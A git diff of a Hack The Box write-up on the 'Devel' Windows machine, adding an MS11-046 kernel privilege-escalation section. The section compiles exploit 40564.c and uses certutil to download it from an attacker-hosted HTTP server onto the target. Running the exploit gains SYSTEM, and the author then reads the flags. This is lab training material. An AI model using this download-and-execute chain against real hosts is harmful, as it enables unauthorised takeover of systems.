@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: iis ftp anonymousloginallowed reverseshell aspx 
+tags: iis ftp anonymousloginallowed reverseshell aspx msfvenom kernel 
 ---
 
 <br />
@@ -69,7 +69,7 @@ Open Ports:
 
 <br />
 
-## Http Enumeration: -> Port 80
+# Http Enumeration: -> Port 80
 
 <br />
 
@@ -85,7 +85,7 @@ Since this is the default `IIS` page, we can infer that the system behind the we
 
 <br />
 
-## Ftp Enumeration: -> Port 21 
+# Ftp Enumeration: -> Port 21 
 
 <br />
 
@@ -307,9 +307,13 @@ Network Card(s):           1 NIC(s) Installed.
 
 <br />
 
+## MS11-046:
+
+<br />
+
 The Windows version in use is quite `old`, and as we know, older versions are much more likely to contain `kernel` vulnerabilities.
 
-Searching on google we found an interest db `exploit` to the `OS` version (6.1.7600 N/A Build 7600):
+By searching on Google we found an interest `exploit` targeting this `OS` version (6.1.7600 N/A Build 7600):
 
 <br />
 
@@ -317,7 +321,7 @@ Searching on google we found an interest db `exploit` to the `OS` version (6.1.7
 
 <br />
 
-We get it to out attacker machine using searchsploit:
+We download it to our attacker machine using `searchsploit`:
 
 <br />
 
@@ -333,3 +337,91 @@ Copied to: /home/theredp4nther/Imágenes/40564.c
 ```
 
 <br />
+
+Now that we have the `exploit` source code into our machine, the next step is to `compile` it and transfer the binary to the `target` system for execution:
+
+<br />
+
+```bash
+❯ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
+```
+
+<br />
+
+To transfer it, we are going to use a `python` http server:
+
+<br />
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+<br />
+
+Now we download the `exploit.exe` in the victim machine using `certutil`:
+
+<br />
+
+```bash
+c:\Users\Public\Documents>certutil -f -urlcache -split http://10.10.14.10/exploit.exe C:\Users\Public\Documents\exploit.exe 
+
+****  Online  ****
+  000000  ...
+  03a985
+CertUtil: -URLCache command completed successfully.
+```
+
+<br />
+
+Execute the exploit:
+
+<br />
+
+```bash
+c:\Users\Public\Documents>dir
+
+ Volume in drive C has no label.
+ Volume Serial Number is 137F-3971
+
+ Directory of c:\Users\Public\Documents
+
+07/04/2025  04:02 ��    <DIR>          .
+07/04/2025  04:02 ��    <DIR>          ..
+07/04/2025  04:02 ��           240.005 exploit.exe
+               1 File(s)        240.005 bytes
+               2 Dir(s)   4.692.234.240 bytes free
+
+c:\Users\Public\Documents>.\exploit.exe
+
+c:\Windows\System32>whoami
+
+nt authority\system
+
+```
+
+<br />
+
+GG!! We are ng authority\system!!
+
+Let's take the user flags:
+
+<br />
+
+```bash
+C:\Users\Public\Documents>type C:\Users\babis\Desktop\user.txt
+type C:\Users\babis\Desktop\user.txt
+502e368532fac6d231f4e8f309xxxxxx
+
+C:\Users\Public\Documents>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+286f7f78192699523bbc2c170cxxxxxx
+```
+
+<br />
+
+Machine Devel pwned! 
+
+This was a really easy Windows machine. Since it's only the second one on this page, we'll gradually increase the difficulty as we go.
+
+I hope you have enjoyed. Keep hacking!!❤️❤️
